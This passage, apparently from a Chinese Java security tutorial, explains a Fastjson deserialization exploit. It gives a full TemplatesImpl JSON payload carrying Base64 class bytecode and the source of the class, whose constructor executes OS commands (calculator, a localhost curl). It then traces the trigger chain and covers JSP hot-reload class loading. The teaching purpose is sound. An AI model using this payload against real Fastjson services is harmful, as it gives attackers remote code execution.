{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIAPgoADwAfCAAgCAAhCgAiACMIACQKACUAJggAJwgAKAgAKQoAKgArCgAqACwHAC0KAAwALgcALwcAMAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwAvBwAxBwAtAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAMgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQAZVGVzdEFic3RyYWN0VHJhbnNsZXQuamF2YQwAEAARAQAWb3BlbiAtYSBDYWxjdWxhdG9yLmFwcAEAB29zLm5hbWUHADMMADQANQEAB1dpbmRvd3MHADEMADYANwEAFmNhbGMgMTIzNDU2Nzg5MDEyMzQ1NjcBAAVMaW51eAEAFGN1cmwgbG9jYWxob3N0Ojk5OTkvBwA4DAA5ADoMADsAPAEAE2phdmEvaW8vSU9FeGNlcHRpb24MAD0AEQEALmNvbS9hbmJhaS9zZWMvY2xhc3Nsb2FkZXIvVGVzdEFic3RyYWN0VHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAQamF2YS9sYW5nL1N0cmluZwEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAOAA8AAAAAAAMAAQAQABEAAQASAAAAowACAAQAAAA5KrcAARICTBIDuAAETSwSBbYABpkACRIHTKcADywSCLYABpkABhIJTLgACiu2AAtXpwAITi22AA2xAAEAKAAwADMADAACABMAAAAyAAwAAAANAAQADgAHAA8ADQARABYAEgAcABMAJQAUACgAGAAwABsAMwAZADQAGgA4ABwAFAAAABgABP8AHAADBwAVBwAWBwAWAAALSgcAFwQAAQAYABkAAgASAAAAGQAAAAMAAAABsQAAAAEAEwAAAAYAAQAAACEAGgAAAAQAAQAbAAEAGAAcAAIAEgAAABkAAAAEAAAAAbEAAAABABMAAAAGAAEAAAAmABoAAAAEAAEAGwABAB0AAAACAB4="],"_name":"","_tfactory":{},"_outputProperties":{}}
```

`@type`标注的是需要反序列化的类名`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，`_bytecodes`是经过Base64编码（FastJson会自动解码成byte[]）后的`com.anbai.sec.classloader.TestAbstractTranslet`类字节码，`_name`、`_tfactory`、`_outputProperties`没有什么实际意义这里保持不为空就可以了。

传入的`_bytecodes`字节码是class文件经过Base64编码的字符串（Linux下可以使用base64命令，如：`base64 TestAbstractTranslet.class`），该类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，示例中的`TestAbstractTranslet.java`的代码如下：

```java
package com.anbai.sec.classloader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class TestAbstractTranslet extends AbstractTranslet {
    public TestAbstractTranslet() {
        // Windows和MacOS是弹出计算器，Linux会执行curl localhost:9999/
        String command = "open -a Calculator.app";
        String osName  = System.getProperty("os.name");

        if (osName.startsWith("Windows")) {
            command = "calc 12345678901234567";
        } else if (osName.startsWith("Linux")) {
            command = "curl localhost:9999/";
        }

        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
    }
}
```

Fastjson会创建`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类实例，并通过json中的字段去映射`TemplatesImpl`类中的成员变量，比如将`_bytecodes` 经过Base64解码后将byte[]映射到`TemplatesImpl`类的`_bytecodes`上，其他字段同理。但仅仅是属性映射是无法触发传入的类实例化的，还必须要调用`getOutputProperties()`方法才会触发`defineClass`（使用传入的恶意类字节码创建类）和`newInstance`（创建恶意类实例，从而触发恶意类构造方法中的命令执行代码），此时已是万事俱备，只欠东风了。

Fastjson在解析类成员变量（`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField`）的时候会将`private Properties _outputProperties;`属性与`getOutputProperties()`关联映射（FastJson的`smartMatch()`会忽略`_`、`-`、`is`（仅限boolean/Boolean类型），所以能够匹配到`getOutputProperties()`方法），因为`_outputProperties`是Map类型（Properties是Map的子类）所以不需要通过set方法映射值（`fieldInfo.getOnly`），因此在setValue的时候会直接调用`getOutputProperties()`方法，如下图：

![img](https://oss.javasec.org/images/202110251829689.png)

调用`getOutputProperties()`方法后会触发类创建和实例化，如下图：

![img](https://oss.javasec.org/images/202110251829680.png)

**defineClass TestAbstractTranslet调用链：**

```java
java.lang.ClassLoader.defineClass(ClassLoader.java:794)
        java.lang.ClassLoader.defineClass(ClassLoader.java:643)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
        com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
        com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
```

创建`TestAbstractTranslet`类实例，如下图：

![img](https://oss.javasec.org/images/202110251829828.png)

创建`TestAbstractTranslet`类实例时就会触发`TestAbstractTranslet`构造方法中的命令执行代码，调用链如下：

```java
java.lang.Runtime.exec(Runtime.java:347)
        com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
        sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
        sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
        java.lang.reflect.Constructor.newInstance(Constructor.java:526)
        java.lang.Class.newInstance(Class.java:383)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
        com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
        com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
```



## JSP类加载

JSP是JavaEE中的一种常用的脚本文件，可以在JSP中调用Java代码，实际上经过编译后的jsp就是一个Servlet文件，JSP和PHP一样可以实时修改。

众所周知，Java的类是不允许动态修改的（这里特指新增类方法或成员变量），之所以JSP具备热更新的能力，实际上借助的就是自定义类加载行为，当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。



**示例 - 模拟的JSP文件动态加载程序：**

```java
package com.anbai.sec.classloader;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.File;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

public class TestJSPClassLoader {

    /**
     * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载
     */
    private final Map<File, JSPClassLoader> jspClassLoaderMap = new HashMap<File, JSPClassLoader>();

    /**
     * 创建用于测试的test.jsp类字节码，类代码如下：
     * <pre>
     * package com.anbai.sec.classloader;
     *
     * public class test_jsp {
     *     public void _jspService() {
     *         System.out.println("Hello...");
     *     }
     * }
     * </pre>
     *
     * @param className 类名
     * @param content   用于测试的输出内容，如：Hello...
     * @return test_java类字节码
     * @throws Exception 创建异常
     */
    public static byte[] createTestJSPClass(String className, String content) throws Exception {
        // 使用Javassist创建类字节码
        ClassPool classPool = ClassPool.getDefault();

        // 创建一个类，如：com.anbai.sec.classloader.test_jsp
        CtClass ctServletClass = classPool.makeClass(className);

        // 创建_jspService方法
        CtMethod ctMethod = new CtMethod(CtClass.voidType, "_jspService", new CtClass[]{}, ctServletClass);
        ctMethod.setModifiers(Modifier.PUBLIC);

        // 写入hello方法代码
        ctMethod.setBody("System.out.println(\"" + content + "\");");

        // 将hello方法添加到类中
        ctServletClass.addMethod(ctMethod);

        // 生成类字节码
        byte[] bytes = ctServletClass.toBytecode();

        // 释放资源
        ctServletClass.detach();

        return bytes;
    }

    /**
     * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码
     *
     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
     * @param className 类名
     * @param bytes     类字节码
     * @param parent    JSP的父类加载
     */
    public JSPClassLoader getJSPFileClassLoader(File jspFile, String className, byte[] bytes, ClassLoader parent) {
        JSPClassLoader jspClassLoader = this.jspClassLoaderMap.get(jspFile);

        // 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建
        if (jspClassLoader == null) {
            jspClassLoader = new JSPClassLoader(parent);
            jspClassLoader.createClass(className, bytes);

            // 缓存JSP文件和所使用的类加载器
            this.jspClassLoaderMap.put(jspFile, jspClassLoader);

            return jspClassLoader;
        }

        // 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，
        // 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，
        // 那么需要热加载该类字节码到类加载器。
        if (jspFile.lastModified() == 0) {
            jspClassLoader = new JSPClassLoader(parent);
            jspClassLoader.createClass(className, bytes);

            // 缓存JSP文件和所使用的类加载器
            this.jspClassLoaderMap.put(jspFile, jspClassLoader);
            return jspClassLoader;
        }

        return null;
    }

    /**
     * 使用动态的类加载器调用test_jsp#_jspService方法
     *
     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
     * @param className 类名
     * @param bytes     类字节码
     * @param parent    JSP的父类加载
     */
    public void invokeJSPServiceMethod(File jspFile, String className, byte[] bytes, ClassLoader parent) {
        JSPClassLoader jspClassLoader = getJSPFileClassLoader(jspFile, className, bytes, parent);

        try {
            // 加载com.anbai.sec.classloader.test_jsp类
            Class<?> jspClass = jspClassLoader.loadClass(className);

            // 创建test_jsp类实例
            Object jspInstance = jspClass.newInstance();

            // 获取test_jsp#_jspService方法
            Method jspServiceMethod = jspClass.getMethod("_jspService");

            // 调用_jspService方法
            jspServiceMethod.invoke(jspInstance);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        TestJSPClassLoader test = new TestJSPClassLoader();

        String      className   = "com.anbai.sec.classloader.test_jsp";
        File        jspFile     = new File("/data/test.jsp");
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();

        // 模拟第一次访问test.jsp文件自动生成test_jsp.java
        byte[] testJSPClass01 = createTestJSPClass(className, "Hello...");

        test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);

        // 模拟修改了test.jsp文件，热加载修改后的test_jsp.class
        byte[] testJSPClass02 = createTestJSPClass(className, "World...");
        test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);
    }

    /**
     * JSP类加载器
     */
    static class JSPClassLoader extends ClassLoader {

        public JSPClassLoader(ClassLoader parent) {
            super(parent);
        }

        /**
         * 创建类
         *
         * @param className 类名
         * @param bytes     类字节码
         */
        public void createClass(String className, byte[] bytes) {
            defineClass(className, bytes, 0, bytes.length);
        }

    }

}
```

该示例程序通过Javassist动态生成了两个不同的`com.anbai.sec.classloader.test_jsp`类字节码，模拟JSP文件修改后的类加载，核心原理就是**检测到JSP文件修改后动态替换类加载器**，从而实现JSP热加载，具体的处理逻辑如下（第3和第4部未实现，使用了Javassist动态创建）：

1. 模拟客户端第一次访问test.jsp；
2. 检测是否已缓存了test.jsp的类加载；
3. ~~Servlet容器找到test.jsp文件并编译成test_jsp.java~~；
4. ~~编译成test_jsp.class文件~~；
5. 创建test.jsp文件专用的类加载器`jspClassLoader`，并缓存到`jspClassLoaderMap`对象中；
6. `jspClassLoader`加载test_jsp.class字节码并创建`com.anbai.sec.classloader.test_jsp`类；
7. `jspClassLoader`调用`com.anbai.sec.classloader.test_jsp`类的`_jspService`方法；
8. 输出`Hello...`；
9. 模拟客户端第二次访问test.jsp；
10. 假设test.jsp文件发生了修改，重新编译test.jsp并创建一个新的类加载器`jspClassLoader`加载新的类字节码；
11. 使用新创建的`jspClassLoader`类加载器调用`com.anbai.sec.classloader.test_jsp`类的`_jspService`方法；
12. 输出`World...`；



## ClassLoader总结

`ClassLoader`是JVM中一个非常重要的组成部分，`ClassLoader`可以为我们加载任意的java类，通过自定义`ClassLoader`更能够实现自定义类加载行为，在后面的几个章节我们也将讲解`ClassLoader`的实际利用场景。